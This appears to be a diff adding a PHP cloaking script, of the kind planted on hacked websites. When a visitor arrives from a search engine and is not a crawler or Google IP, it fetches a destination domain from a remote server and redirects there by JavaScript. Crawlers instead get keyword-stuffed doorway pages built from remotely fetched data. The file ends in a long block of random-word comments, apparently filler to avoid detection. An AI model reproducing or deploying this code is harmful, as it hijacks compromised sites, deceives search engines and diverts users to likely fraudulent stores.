+$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
+// $_SERVER["HTTP_REFERER"] = "google.com";
+if(isset($_SERVER["HTTP_REFERER"])){
+	$referer = $_SERVER["HTTP_REFERER"]; 
+	$russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';	
+
+	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255') ,  array('66.102.0.0' , '66.102.15.255') , array('66.249.64.0' , '66.249.95.255') , array('72.14.192.0' , '72.14.255.255') , array('74.125.0.0' , '74.125.255.255') , array('209.85.128.0' , '209.85.255.255') , array('216.239.32.0' , '216.239.63.255') , array('64.18.0.0' , '64.18.15.255') , array('108.177.8.0' , '108.177.15.255') , array('172.217.0.0' , '172.217.31.255') , array('173.194.0.0' , '173.194.255.255') , array('207.126.144.0' , '207.126.159.255') , array('216.58.192.0' , '216.58.223.255') , array('64.68.90.1' , '64.68.90.255') , array('64.233.173.193' , '64.233.173.255') , array('66.249.64.1' , '66.249.79.255') , array('216.239.33.96' , '216.239.59.128') , array('64.68.80.0' , '64.68.92.255') , array('2001:4860:4000:0:0:0:0:0' , '2001:4860:4fff:ffff:ffff:ffff:ffff:ffff') , array('2404:6800:4000:0:0:0:0:0' , '2404:6800:4fff:ffff:ffff:ffff:ffff:ffff') , array('2607:f8b0:4000:0:0:0:0:0' , '2607:f8b0:4fff:ffff:ffff:ffff:ffff:ffff') , array('2800:3f0:4000:0:0:0:0:0' , '2800:3f0:4fff:ffff:ffff:ffff:ffff:ffff') , array('2a00:1450:4000:0:0:0:0:0' , '2a00:1450:4fff:ffff:ffff:ffff:ffff:ffff') , array('2c0f:fb50:4000:0:0:0:0:0' , '2c0f:fb50:4fff:ffff:ffff:ffff:ffff:ffff') );  
+	$localIp = get_real_ip();	
+	$is_or_no = is_ip($localIp,$ipRanges);
+	$iszz = isCrawler();	
+	
+	if(function_exists('gethostbyaddr')){
+		$hostname = gethostbyaddr($localIp);
+		$is_g_ip = preg_match("#google#i", "$hostname") === 1;
+	}else{
+		$is_g_ip = 0;
+	}
+	
+	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false && !$is_g_ip){
+		$rsdom = '#^https?://www\.[^/]+/$#i';
+		
+		$jums1 = $rs_http.$temp_abc.$rs_ptth. CURRENUSE . $siteid .".txt";	
+		$jums2 = $rs_http.$temp_def.$rs_ptth. CURRENUSE . $siteid .".txt";
+	
+		for($i=0;$i<2;$i++){
+			$jumstz = curl_getjs_from_webpage($jums1,2);
+			$jumstz = trim($jumstz);
+
+			if(!preg_match($rsdom,$jumstz)){
+				$jumstz = curl_getjs_from_webpage($jums2,10);
+			
+				$jumstz = trim($jumstz);
+				if(preg_match($rsdom,$jumstz))
+					break;
+			}else{
+				break;
+			}
+		}
+		
+		echo '<!DOCTYPE html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><script>window.location = "'. $jumstz . "index.php?main_page=product_info&products_id=" . $id23 .'";</script></head><body></body></html>';		die();	
+	}
+}
+ 
+ 
+ $fcontent = '';
+ 
+ 
+ $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID";  
+ $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
+ $rsInfo = '#<info>(.*)</info>#si';
+ preg_match($rsInfo,$pInfoStr,$matchInfo);
+ if(isset($matchInfo[1])){
+	 $InFoStrArr = unserialize($matchInfo[1]);
+ }else{
+	 exit;
+ }
+ 
+
+ 
+ 
+ if(isset($InFoStrArr['frStr2'])){
+	$frStr2 = $InFoStrArr['frStr2'];
+	$fr2Arr = unserialize($frStr2);
+ }
+ 
+$frStr1 = $InFoStrArr['frStr1'];
+$fr1Arr = unserialize($frStr1);
+
+$Ptitle = $InFoStrArr['Ptitle'];
+$PtitleNowid = $Ptitle;
+$nowIdName = $InFoStrArr['nowIdName'];
+
+if(strstr($Ptitle,'#cat#')){
+	$tp_title_arr = explode('#cat#',$Ptitle);
+	$Ptitle = $tp_title_arr[1];
+}
+
+$pcatstr = $InFoStrArr['pcatstr'];
+$nowPreStr = $InFoStrArr['nowPreStr'];
+$nowNextStr = $InFoStrArr['nowNextStr'];
+$nowMateAddStr = $InFoStrArr['nowMateAddStr'];
+$nowMateAddArr = unserialize($nowMateAddStr);
+
+
+$falgMateDes = 0;
+if(strstr($pcatstr,'#cname#')){
+	$temparrI = explode('#cname#',$pcatstr);
+	$catStr = $temparrI[0];
+	$catArr = explode('^',$catStr);
+	$tparrCat = array();
+	$catArrII = array();
+	foreach($catArr as $vs){
+		$vs = str_replace('&amp;','&',$vs);
+		if(!isset($tparrCat[$vs])){
+			$tparrCat[$vs] = 1;
+			$catArrII[] = $vs;
+		}
+	}
+
+	$catArr = $catArrII;
+	
+	$mateStr = $temparrI[1];
+	if(strstr($mateStr,'#keydescription#')){
+		$temparrII = explode('#keydescription#',$mateStr);
+		$pkeyword = trim($temparrII[0]);
+		if(!$pkeyword){
+			$pkeyword = $Ptitle;
+		}else{
+			$keyArr = explode(',',$pkeyword);
+			$num = count($keyArr);
+
+			$yushu = KEYJG % $num;
+
+			$arrPre = array();
+			$arrLast = array();
+
+			for($i=0;$i<$num;$i++){
+				if($i<$yushu){
+					$arrLast[] = $keyArr[$i];
+				}else{
+					$arrPre[] = $keyArr[$i];
+				}
+			}
+
+			if(count($arrLast)){
+				foreach($arrLast as $vs){
+					$arrPre[] = $vs;
+				}
+			}
+			
+			$pkeyword = implode(',',$arrPre);
+			$pkeywordYuanShi = $pkeyword;
+
+		}
+		
+		$pdescription = trim($temparrII[1]);
+		if(!$pdescription){
+			$falgMateDes=1;
+		}else{
+			$DesArr = explode(',',$pdescription);
+			$num = count($DesArr);
+
+			$yushu = KEYJG % $num;
+
+			$arrPre = array();
+			$arrLast = array();
+
+			for($i=0;$i<$num;$i++){
+				if($i<$yushu){
+					$arrLast[] = $DesArr[$i];
+				}else{
+					$arrPre[] = $DesArr[$i];
+				}
+			}
+
+			if(count($arrLast)){
+				foreach($arrLast as $vs){
+					$arrPre[] = $vs;
+				}
+			}
+
+			if(count($nowMateAddArr)){
+				foreach($nowMateAddArr as $vs){
+					$arrPre[] = $vs;
+				}
+			}
+			
+			$pdescription = implode(',',$arrPre);
+			
+			$pDescriptionYuanShi = $pdescription;
+		}
+		
+	}else{
+		$pkeyword = $Ptitle;
+		$falgMateDes=1;
+	}
+}else{
+	$catArr = array();
+	if(strstr($mateStr,'#keydescription#')){
+		$temparrII = explode('#keydescription#',$mateStr);
+		$pkeyword = $temparrII[0];
+		if(!$pkeyword){
+			$pkeyword = $Ptitle;
+		}else{
+			$keyArr = explode(',',$pkeyword);
+			$num = count($keyArr);
+
+			$yushu = KEYJG % $num;
+
+			$arrPre = array();
+			$arrLast = array();
+
+			for($i=0;$i<$num;$i++){
+				if($i<$yushu){
+					$arrLast[] = $keyArr[$i];
+				}else{
+					$arrPre[] = $keyArr[$i];
+				}
+			}
+
+			if(count($arrLast)){
+				foreach($arrLast as $vs){
+					$arrPre[] = $vs;
+				}
+			}
+			
+			$pkeyword = implode(',',$arrPre);
+			$pkeywordYuanShi = $pkeyword;
+
+		}
+		
+		$pdescription = trim($temparrII[1]);
+		if(!$pdescription){
+			$falgMateDes=1;
+		}else{
+			$DesArr = explode(',',$pdescription);
+			$num = count($DesArr);
+
+			$yushu = KEYJG % $num;
+
+			$arrPre = array();
+			$arrLast = array();
+
+			for($i=0;$i<$num;$i++){
+				if($i<$yushu){
+					$arrLast[] = $DesArr[$i];
+				}else{
+					$arrPre[] = $DesArr[$i];
+				}
+			}
+
+			if(count($arrLast)){
+				foreach($arrLast as $vs){
+					$arrPre[] = $vs;
+				}
+			}
+			
+			if(count($nowMateAddArr)){
+				foreach($nowMateAddArr as $vs){
+					$arrPre[] = $vs;
+				}
+			}
+			
+			$pdescription = implode(',',$arrPre);
+			
+			$pDescriptionYuanShi = $pdescription;
+		}
+	}else{
+		$pkeyword = $Ptitle;
+		$falgMateDes=1;
+	}
+}
+
+if($falgMateDes){
+
+			$desPosition = (KEYJG + $id23) % 6;
+
+			if($desPosition == 0)
+				$pdescription = $Ptitle .' '. $nowMateAddArr[0] .' '. $nowMateAddArr[1];
+			elseif($desPosition == 1)
+				$pdescription = $nowMateAddArr[1] .' '. $Ptitle .' '. $nowMateAddArr[0];
+			elseif($desPosition == 2)
+				$pdescription = $Ptitle .' '. $nowMateAddArr[0] .' '. $nowMateAddArr[1];
+			elseif($desPosition == 3)
+				$pdescription = $nowMateAddArr[1] .' '. $nowMateAddArr[0] .' '. $Ptitle;
+			elseif($desPosition == 4)
+				$pdescription = $nowMateAddArr[0] .' '. $Ptitle .' '. $nowMateAddArr[1];
+			elseif($desPosition == 5)
+				$pdescription = $nowMateAddArr[0] .' '. $nowMateAddArr[1] .' '. $Ptitle;
+			
+			
+}
+
+$tpKeyStrCat = -1;
+$BreadStr = getBreadcrum($Ptitle,$catArr,$id23,$PtitleNowid);
+
+if(count($catArr)){
+	$endCatName = end($catArr);
+	$beginCatName = $catArr[0];
+	$addKeyWordStr = ', ' . implode(', ', $catArr);
+}else{
+	$beginCatName = '';
+	$endCatName = '';
+}
+
+if(function_exists("preg_split")){
+	$PtitleArr = preg_split('/\s+/us', $Ptitle);		
+}else{
+	$PtitleArr = explode(' ', $Ptitle);
+}
+
+$tpTitleArr = array();
+foreach($PtitleArr as $vs){
+	$vs = trim($vs);
+	if($vs){
+		$tpTitleArr[] = $vs;
+	}
+}
+
+
+
+$numTitleArr = count($tpTitleArr);
+
+
+$randTkeyI =  RANDNUMI % $numTitleArr;
+
+$createTitleI = getRandStrArr($tpTitleArr,$randTkeyI);
+
+$randTkeyII =  RANDNUMII % $numTitleArr;
+if($randTkeyI == $randTkeyII){
+	$randTkeyII = abs($randTkeyI-2);
+}
+
+$createTitleII = getRandStrArr($tpTitleArr,$randTkeyII);
+
+$arrTopStrs = array();
+$arrTopStrs[] = $createTitleI;
+$arrTopStrs[] = $pdescription;
+$arrTopStrs[] = $createTitleII;
+$arrTopStrs[] = '###nowtitles###';
+
+$fistKey = ($id23 + RANDNUMI) % count($arrTopStrs);
+$secondKey = ($id23 * RANDNUMII) % count($arrTopStrs);
+if($fistKey == $secondKey){
+	$secondKey = ($fistKey + 1) % count($arrTopStrs);
+}
+
+$keyRandThree = ($id23 + KEYJG) % 2;
+
+foreach($arrTopStrs as $key=>$vs){
+	if($key != $fistKey && $key != $secondKey){
+		if($keyRandThree == 0){
+			if(!isset($threeKey)){
+				$threeKey = $key;
+			}else{
+				$fourKey = $key;
+			}
+		}else{
+			if(!isset($fourKey)){
+				$fourKey = $key;
+			}else{
+				$threeKey = $key;
+			}
+			
+		}
+		
+	}
+}
+
+$headAddStr = '<p>' .$arrTopStrs[$fistKey] .', '. $arrTopStrs[$secondKey] .', '.  $arrTopStrs[$threeKey] .', '. $arrTopStrs[$fourKey] .'.</p>' . PHP_EOL;
+
+
+$tempKeyArr = array();
+$tempKeyArr[$randTkeyI] = 1; 
+$tempKeyArr[$randTkeyII] = 1; 
+
+$keyJg = ($id23 + KEYJG) % 3 + 1;
+
+$bgKeyNs = ($id23 + KEYJG) % $numTitleArr;
+for($i=0;$i<20;$i++){
+	if(!isset($tempKeyArr[$bgKeyNs]) && !isset($randTkeyIII)){
+		$randTkeyIII = $bgKeyNs;
+		$tempKeyArr[$randTkeyIII] = 1;
+	}elseif(!isset($tempKeyArr[$bgKeyNs])){
+		$randTkeyIIII = $bgKeyNs;
+		$tempKeyArr[$randTkeyIIII] = 1;
+		break;
+	}
+	
+	$bgKeyNs = ($bgKeyNs + $keyJg) % $numTitleArr;
+}
+
+
+if(!isset($randTkeyIII))
+	$randTkeyIII = $randTkeyI;
+
+if(!isset($randTkeyIIII))
+	$randTkeyIIII = $randTkeyII;
+
+
+$createTitleIII = getRandStrArr($tpTitleArr,$randTkeyIII);
+
+$createTitleIIII = getRandStrArr($tpTitleArr,$randTkeyIIII);
+
+$arrLastStrs = array();
+$arrLastStrs[] = $createTitleIII;
+$arrLastStrs[] = $createTitleIIII;
+$arrLastStrs[] = '###nowtitles###';
+
+$fistKey = ($id23 + RANDNUMI) % count($arrLastStrs);
+$secondKey = ($id23 * RANDNUMII) % count($arrLastStrs);
+if($fistKey == $secondKey){
+	$secondKey = ($fistKey + 1) % count($arrLastStrs);
+}
+
+foreach($arrLastStrs as $key=>$vs){
+	if($key != $fistKey && $key != $secondKey){
+		$threeKey = $key;
+	}
+}
+
+$footAddStrII = '<p>' . $arrLastStrs[$fistKey] .', '. $arrLastStrs[$secondKey] .', '.  $arrLastStrs[$threeKey] .'.</p>' . PHP_EOL;
+
+
+
+$addTopStr = '';
+$addTopStr .= "<h1>{$Ptitle}</h1>".PHP_EOL;
+$addTopStr .= $BreadStr.PHP_EOL;
+// $addTopStr .= "<strong>{$Ptitle}</strong>".PHP_EOL;
+$addTopStr .= $headAddStr;
+
+
+
+
+$tpaddstr = '';
+$tpaddstr .= "<h2>{$Ptitle}</h2>".PHP_EOL;
+
+// $tpaddstr .= get_shares();
+
+if(isset($InFoStrArr['nowPimgArr'])){
+	$tpImgArr = unserialize($InFoStrArr['nowPimgArr']);
+	foreach($tpImgArr as $tpimg){
+		$tpaddstr .= $tpimg."<br/>".PHP_EOL;
+	}
+}
+
+
+$strYsImgs = '';
+if(isset($InFoStrArr['nowPimgArrYs'])){
+	$tpImgArr = unserialize($InFoStrArr['nowPimgArrYs']);
+	foreach($tpImgArr as $tpimg){
+		$strYsImgs .= $tpimg."<br/>".PHP_EOL;
+	}
+}
+
+
+if(isset($InFoStrArr['pdes'])){
+	$InFoStrArr['pdes'] =  preg_replace('#\s+#si',' ',$InFoStrArr['pdes']);
+	$tpaddstr .= '<p>'.$InFoStrArr['pdes']."</p>".PHP_EOL;
+}
+
+
+
+
+$arrFlinks = array();
+$fr1Strs = '<ul>'.PHP_EOL;
+$numFrlFlag = 0;
+$numFrl = count($fr1Arr) / 2;
+foreach($fr1Arr as $key=>$vs){
+	if($numFrlFlag == $numFrl)
+		break;
+	$tpPid = $key;
+	$tpFlink = getalink($tpPid,$vs);
+	
+	if(strstr($vs,'#cat#')){
+		$tp_name_arr = explode('#cat#',$vs);
+		$vs = $tp_name_arr[1];
+	}
+	
+	$fr1Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
+	$arrFlinks[] = '<a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a>';
+	$numFrlFlag++;
+	unset($fr1Arr[$key]);
+	
+}
+$fr1Strs .= '</ul>'.PHP_EOL;
+
+if(count($fr1Arr)){
+	$fr2Arr = $fr1Arr;
+}
+
+if(isset($fr2Arr)){
+	$fr2Strs = '<ul>'.PHP_EOL;
+	foreach($fr2Arr as $key=>$vs){
+		$tpPid = $key;
+		$tpFlink = getalink($tpPid,$vs);
+		
+		
+		if(strstr($vs,'#cat#')){
+			$tp_name_arr = explode('#cat#',$vs);
+			$vs = $tp_name_arr[1];
+		}
+		
+		$fr2Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
+	}
+	$fr2Strs .= '</ul>'.PHP_EOL;
+}
+
+
+
+$addStrDes1 = '';
+if(isset($InFoStrArr['nowDesNameArrStr'])){
+	
+	$Random =  (KEYJG + $id23)  % 4 + 2;
+
+	
+	$tpDesNameArr = unserialize($InFoStrArr['nowDesNameArrStr']);
+	
+	$lenthNameArr = count($tpDesNameArr);
+	$lenthFlinkArr = $Random;
+	$numShan = intval($lenthNameArr/$lenthFlinkArr);
+	if($numShan < 1)
+		$numShan = 1;
+	
+	
+	
+	$flag = 0;
+	
+	$shengyu = $lenthNameArr - $lenthFlinkArr * $numShan;
+	$shengyu = $shengyu - 2;
+	$bgnum = 0;
+	$endnum = $lenthNameArr - 1;
+	$arrKeyNum = array();
+	while($shengyu > 0){
+		$arrKeyNum[$bgnum++] = $numShan + 1;
+		$shengyu--;
+		if($shengyu > 0){
+			$arrKeyNum[$endnum--] = $numShan + 1;
+		}
+		$shengyu--;
+	}
+
+	
+	$nowTempFlag = 0;
+	$nowTempNumFlag = 0;
+	
+	$tempDesNameArr = array();
+	
+	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
+		$nowLens = isset($arrKeyNum[$nowTempFlag]) ? $arrKeyNum[$nowTempFlag] : $numShan;
+		if($nowTempNumFlag < $nowLens){
+			$tempDesNameArr[] = $tpdesVs;
+			$nowTempNumFlag++;
+		}else{
+			$tempDesNameArr[] = "{$Ptitle}";
+			$nowTempFlag++;
+			
+			
+			$tempDesNameArr[] = $tpdesVs;
+			$nowTempNumFlag=1;
+		}
+		
+	}
+	
+	while($nowTempFlag <= $lenthFlinkArr-1){
+		$nowTempFlag++;
+		$tempDesNameArr[] = "{$Ptitle}";
+	}
+	
+	
+	$tpDesNameArr = $tempDesNameArr;
+	$tempArrLen = count($tpDesNameArr) - 1;
+	
+	$i=0;
+	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
+		$tempLen = strlen($tpdesVs) + $i;
+		if($tempLen % 2 == 1){
+			$nowtempfh = ', ';
+		}else
+			$nowtempfh = '. ';
+		
+		
+		
+		if($i == $tempArrLen){
+			$addStrDes1 .= $tpdesVs . '.';
+			// echo $addStrDes1;
+			// exit;
+		}else{
+			$addStrDes1 .= $tpdesVs . $nowtempfh;
+		}
+		$i++;
+		
+	}
+		
+	$addStrDes1 = '<p>'.$addStrDes1.'</p>'.PHP_EOL;
+
+	
+}
+
+
+
+$addStrDesII = '';
+if(isset($InFoStrArr['fpNameStr'])){
+	
+	$Random =  (KEYJG + $id23)  % 2 == 0 ? 3 : 2 ;
+
+	
+	$tpDesNameArr = unserialize($InFoStrArr['fpNameStr']);
+	$tempArrLen = count($tpDesNameArr) - 1;
+	$temp_arr = array();
+	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
+		
+		if(strstr($tpdesVs,'#cat#')){
+			$tp_name_arr = explode('#cat#',$tpdesVs);
+			$tpdesVs = $tp_name_arr[1];
+		}
+		
+		$temp_arr[$tpdesKey] = $tpdesVs;
+		
+	}
+	$tpDesNameArr = $temp_arr;
+	
+	
+	
+	$Random =  (KEYJG + $id23*KEYJG)  % 4 + 2;
+
+	$lenthFlinkArr = $Random;
+	$lenthNameArr = count($tpDesNameArr);
+	$numShan = intval($lenthNameArr/$lenthFlinkArr);
+	if($numShan < 1)
+		$numShan = 1;
+	
+	$flag = 0;
+	
+	$shengyu = $lenthNameArr - $lenthFlinkArr * $numShan;
+	$shengyu = $shengyu - 2;
+	$bgnum = 0;
+	$endnum = $lenthNameArr - 1;
+	$arrKeyNum = array();
+	while($shengyu > 0){
+		$arrKeyNum[$bgnum++] = $numShan + 1;
+		$shengyu--;
+		if($shengyu > 0){
+			$arrKeyNum[$endnum--] = $numShan + 1;
+		}
+		$shengyu--;
+	}
+	
+	$nowTempFlag = 0;
+	$nowTempNumFlag = 0;
+	
+	$tempDesNameArr = array();
+	
+	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
+		$nowLens = isset($arrKeyNum[$nowTempFlag]) ? $arrKeyNum[$nowTempFlag] : $numShan;
+		if($nowTempNumFlag < $nowLens){
+			$tempDesNameArr[] = $tpdesVs;
+			$nowTempNumFlag++;
+		}else{
+			$tempDesNameArr[] = "<b>{$Ptitle}</b>";
+			$nowTempFlag++;
+			$tempDesNameArr[] = $tpdesVs;
+			$nowTempNumFlag=1;
+		}
+		
+	}
+	
+		while($nowTempFlag <= $lenthFlinkArr-1){
+			$nowTempFlag++;
+			$tempDesNameArr[] = "<b>{$Ptitle}</b>";
+		}
+	
+
+	$tpDesNameArr = $tempDesNameArr;
+	
+	
+	
+	
+	
+	$i=0;
+	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
+		
+		$tempLen = strlen($tpdesVs) + $i;
+		if($tempLen % 2 == 1){
+			$nowtempfh = ', ';
+		}else
+			$nowtempfh = '. ';
+	
+		
+		if($i == $tempArrLen){
+			$addStrDesII .= $tpdesVs . '.';
+		}else{
+			$addStrDesII .= $tpdesVs . $nowtempfh;
+		}
+		$i++;
+			
+	}
+		
+	$addStrDesII = '<p>'.$addStrDesII.'</p>'.PHP_EOL;
+
+}
+
+
+$addPdesStrII = '';
+$addPdesStrII .= "<h3>{$Ptitle}</h3>".PHP_EOL;
+$addPdesStrII .= $addStrDes1.PHP_EOL;
+$addPdesStrII .= '<br/>'. $fr1Strs;
+
+$addPdesStr = '';
+$addPdesStr .= "<h3>{$Ptitle}</h3>".PHP_EOL;
+$addPdesStr .= $strYsImgs . PHP_EOL ."<br/>";
+$addPdesStr .= $fr2Strs . PHP_EOL;
+
+
+
+
+$addH3Str = "<h3>{$Ptitle}</h3>";
+ 
+ $thisPnameLink = '<a href="">'.$nowIdName.'</a>';
+ $thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
+ 
+ $thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';
+
+$flagH2I = 1;
+$flagH2II = 1;
+$flagH2III = 1;
+
+		$fileMb = fopen("template.html","r");
+			$html = fread($fileMb,filesize("template.html"));	
+
+			$numBz = 0;
+
+			$titleKeys = KEYJG % 6;
+			
+			
+		
+			
+			$catUseKey = (KEYJG + $id23) % count($catArr);
+			$catUseKeyTwo = ((KEYJG+1) * $id23) % count($catArr);
+			if($catUseKey == $catUseKeyTwo)
+				$catUseKeyTwo = ($catUseKeyTwo + 1) % count($catArr);
+			
+			$flagCatThree = 0;
+			if(count($catArr) >= 3){
+				foreach($catArr as $key=>$vs){
+					if($key != $catUseKey && $key != $catUseKeyTwo)
+						$catUseKeyThree = $key;
+				}
+				
+				$catPos =  (KEYJG + $id23) % 2;
+				if($catPos){
+					$catStr = $catArr[$catUseKeyTwo] .' '. $catArr[$catUseKeyThree];
+				}else{
+					$catStr = $catArr[$catUseKeyThree] .' '. $catArr[$catUseKeyTwo];
+				}
+			}else{
+				$catStr = $catArr[$catUseKeyTwo];
+			}
+			
+			$catPreStr = $catArr[$catUseKey];
+			$catStr = $catArr[$catUseKeyTwo];
+			
+			
+			if(preg_match('#.*\.(.*)\..*#i',$thisdom))
+				$usdomStr = preg_replace('#.*\.(.*)\..*#i','\1',$thisdom);
+			else
+				$usdomStr = preg_replace('#(.*)\..*#i','\1',$thisdom);
+			
+			
+			
+			if((KEYJG + $id23) % 2 == 0 && isset($catUseKeyThree)){
+				$addKeyWordStr = ", {$catStr}, {$catPreStr}, ". $catArr[$catUseKeyThree];
+			}else{
+				$addKeyWordStr = ", {$catStr}, {$catPreStr}";
+			}
+
+
+			
+			$titlePosition = (KEYJG + $id23) % 6;
+
+			
+			
+			
+		
+			$arrTT = array();
+			$arrTT[] = $catStr;
+			$arrTT[] = $catPreStr;
+			
+			$ttUseKey = (KEYJG + $id23) % count($arrTT);
+			$ttUseKeyTwo = ((KEYJG+1) * $id23) % count($arrTT);
+			if($ttUseKey == $ttUseKeyTwo)
+				$ttUseKeyTwo = ($ttUseKeyTwo + 1) % count($arrTT);
+			
+			
+			
+			$nowShowTitle = $Ptitle.' '.$usdomStr.' '.$arrTT[$ttUseKey].' '.$arrTT[$ttUseKeyTwo];
+
+
+			
+			
+			
+			
+			$pdescription = trim($pdescription);
+
+			
+		
+			$addTopStr =  str_replace('###nowtitles###',$Ptitle ,$addTopStr);
+			$headAddStr =  str_replace('###nowtitles###',$Ptitle ,$headAddStr);
+			$tpaddstr =  str_replace('###nowtitles###',$Ptitle,$tpaddstr);
+			$footAddStrII =  str_replace('###nowtitles###',$Ptitle,$footAddStrII);
+			
+			$html = str_ireplace('draft_or_post_title',  $nowShowTitle, $html);	
+			$html = str_ireplace('#bbbkeybbb#', $pkeyword . $addKeyWordStr, $html);	
+			$html = str_ireplace('#bbbdesbbb#', $pdescription, $html);	
+			
+			$html = str_ireplace('#bbb1content1bbb#',  $addTopStr, $html);
+			// $html = str_ireplace('#bbb2content2bbb#', $artArr[1], $html);
+			
+			
+
+		
+			if(strstr($html,'#link3#'))
+			if($flagH2I){
+					$html = str_replace('#link3#',$addPdesStrII ,$html);
+					$flagH2I = 0;
+				}else{
+					$html = str_replace('#link3#','',$html);
+				}
+				
+				
+							
+			if(strstr($html,'#flink#'))
+				if($flagH2I){
+					$html = str_replace('#flink#',$addPdesStrII ,$html);
+					$flagH2I = 0;
+				}elseif($flagH2II){
+					$html = str_replace('#flink#',$addPdesStr, $html);
+					$flagH2II = 0;
+				}else{
+					$html = str_replace('#flink#','',$html);
+				}
+				
+				
+				
+			if(strstr($html,'#link4#'))
+				if($flagH2I){
+					$html = str_replace('#link4#',$addPdesStrII ,$html);
+					$flagH2I = 0;
+				}elseif($flagH2II){
+					$html = str_replace('#link4#',$addPdesStr, $html);
+					$flagH2II = 0;
+				}elseif($flagH2III){
+					$html = str_replace('#link4#','',$html);
+					$flagH2III = 0;
+				}else{
+					$html = str_replace('#link4#','',$html);
+				}
+				
+				
+			if(strstr($html,'#link5#'))
+				if($flagH2I){
+					$html = str_replace('#link5#',$addPdesStrII ,$html);
+					$flagH2I = 0;
+				}elseif($flagH2II){
+					$html = str_replace('#link5#',$addPdesStr, $html);
+					$flagH2II = 0;
+				}elseif($flagH2III){
+					$html = str_replace('#link5#','',$html);
+					$flagH2III = 0;
+				}else{
+					$html = str_replace('#link5#','',$html);
+				}
+	
+				
+				
+				if(strstr($html,'#Flink2#'))
+				if($flagH2I){
+					$html = str_replace('#Flink2#',$addPdesStrII ,$html);
+					$flagH2I = 0;
+				}elseif($flagH2II){
+					$html = str_replace('#Flink2#',$addPdesStr, $html);
+					$flagH2II = 0;
+				}elseif($flagH2III){
+					$html = str_replace('#Flink2#','',$html);
+					$flagH2III = 0;
+				}else{
+					$html = str_replace('#Flink2#','',$html);
+				}
+						
+				
+			$lastAddStrs = '';
+			
+			if($flagH2I){
+				$lastAddStrs .= $addPdesStrII  . PHP_EOL;
+			}
+			
+			if($flagH2II){
+				$lastAddStrs .= $addPdesStr. PHP_EOL;
+			}
+			
+			if($lastAddStrs){
+				$tpaddstr = $tpaddstr .PHP_EOL . $lastAddStrs;
+			}
+				
+				
+			$html = str_ireplace('#bbb2content2bbb#', '', $html);
+			$html = str_ireplace('#descontent#', $tpaddstr, $html);
+				
+			$html = str_replace('#link1#','',$html);
+			$html = str_replace('#link2#','',$html);
+				
+
+
+			$footKey = "<h3>{$Ptitle}</h3>". PHP_EOL . $addStrDesII . PHP_EOL;
+			$html = str_replace('</body',$footKey.'</body',$html);
+
+		
+	echo $html;
+ 
+die();
+
+
+	
+/**
+ * alcohol authority bundle campus candidate explosive hatred herd jewel naked parallel phenomenon powder vain.
+ * burst flexible lynar parade.
+ * adequate conservative decay erect faculty manual moral nylon.
+ * breadth interpretation restraint tissue.
+ * applause beforehand breed candidate encounter exceed exceedingly export flee gallery gear glorious hollow launch modify optics oral outstanding phenomenon promote reinforce subt trace unique.
+ * enthusiasm expend extent globe laser male mist particle release reliable restrict submit tarnest torture wax.
+ * boundary cliff decline derive deserve estimate evolve exclaim nuclear prominent rely slope spill textile undergo.
+ * Internet acid appropriate awful battery domestic durable elbow exclude incident interfere interpretation liquor notify opportunity pants phenomenon retain severe terror tremendous twist virtual volcano.
+ * erect expenditure gallery geometry hence notify parallel previous relevant urban waist.
+ * adequate catalog expense incident pursue temptation.
+ * breadth dispose mature particularly.
+ * arouse authority budget casual cope enclose excursion extent jail jealous mature neglect opponent optimistic preserve reliable religion rescue spray territory weave xploit.
+ * domestic excess exclusive flock liberty odd offend semiconductor shuttle swallow violet.
+ * bachelor deposit discrimination equivalent erect expand individual interpretation legislation origin oxygen personal petroleum swallow tedious transmit vanish via volunteer weld.
+ * bacteria career duration emotion gap grand insure maintain organ quit reveal satellite semiconductor shift spill submit subsequent survey target tidy.
+ * arise deaf geometry licence.
+ * approve beforehand burden calendar conquer discrimination emphasize estimate fertilizer herd magnet massive merchant molecule optics passive sequence sexual signature spit tend virtue.
+ * adhere biology elaborate gaze semiconductor slope tender vague.
+ * appreciate approach bachelor deposit discipline emphasize expenditure extraordinary hestiate mission motivate orbit parallel personnel restrain scale smash tremble utilise yawn.
+ * academy inferior scandal swallow.
+ * abundant appreciate architecture bureau code data earthquake entry incident optional personal prosperity repetition subway undertake yawn.
+ * approve campus distribute episode exclude giant hestiate humble leak origin parallel pat previous reinforce sexual splendid submit subway tide vacuum vote withdraw.
+ * adjust applicant calculate diverse extent gallon integrate jungle liable licence medium obstacle opponent oral orchestra passport radiation remedy talent thrust tremble.
+ * academy approve continual echo enviroment episode evolve explosion magnet personal profit restrict retain satellite scandal ultimate.
+ * appoint arichmetic consent disturb medium primitive semester substitute treaty.
+ * accelerate approve aware faculty gallon ingredient insignificant interpretation licence massive nuisance organ primitive render shelter shuttle significance sketch subway version vital.
+ * arouse frustrate hardware minimum stable talent tone.
+ * adhere consent entitle excursion golf inhabitant laser likelihood profitable release rely spur stimulate suburb temporary.
+ * acquire adopt network prescribe radiation.
+ * barrier brake geography infinite inhabitant liquor marveous mere nonsense resistant signature tension undergraduate vain.
+ * commit horror respond suspicious.
+ * breadth candidate encounter expel extinct ruin submerge title trap virtual wagon.
+ * bother candidate column debate fertilizer gear infinite internal junior liberty portion prevail satellite slide suspicion suspicious urgent virus.
+ * defect device expel loosen luxury orbit powder principal register shiver trap video.
+ * substantial thrust utter vibrate.
+ * arichmetic continuous discipline individual jail jungle noticeable prompt trend weed.
+ * award discount expenditure favorite hostile hydrogen individual mutual onion optics petroleum portion previous security software substance tone urban violent.
+ * applicable community gap grant obscure preserve skim subsequent tense tissue virtual.
